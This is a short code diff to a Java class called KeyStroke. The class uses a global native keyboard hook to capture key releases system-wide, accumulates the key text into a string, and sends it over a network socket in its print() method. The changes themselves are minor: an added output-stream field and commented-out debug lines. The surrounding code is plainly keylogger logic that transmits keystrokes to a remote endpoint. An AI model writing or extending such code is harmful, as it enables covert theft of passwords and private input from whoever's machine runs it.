@@ -45,6 +45,7 @@ public class KeyStroke extends JFrame implements NativeKeyListener{
     private String path;
     private DataInputStream dataInputStream;
 	private ObjectInputStream objectInputStream;
+    private DataOutputStream dataOutputStream;
     private Socket socket;
     public KeyStroke()
     {
@@ -96,9 +97,11 @@ public class KeyStroke extends JFrame implements NativeKeyListener{
         b_hook = false;
         b_unhook = true;
     }
+    
     public void print() throws IOException {
         DataOutputStream cout = new DataOutputStream(socket.getOutputStream());
         cout.writeUTF(s);
+        //System.out.println(s);
         cout.flush();
         s="";
     }
@@ -121,7 +124,7 @@ public class KeyStroke extends JFrame implements NativeKeyListener{
     }
     public void nativeKeyReleased(NativeKeyEvent e) {
         if (b_hook == true && b_unhook == false) {
-            //  System.out.println(" Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
+            //System.out.println(" Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
             String pressed = NativeKeyEvent.getKeyText(e.getKeyCode());
             if (pressed.equals("⇧" +
                     ""))
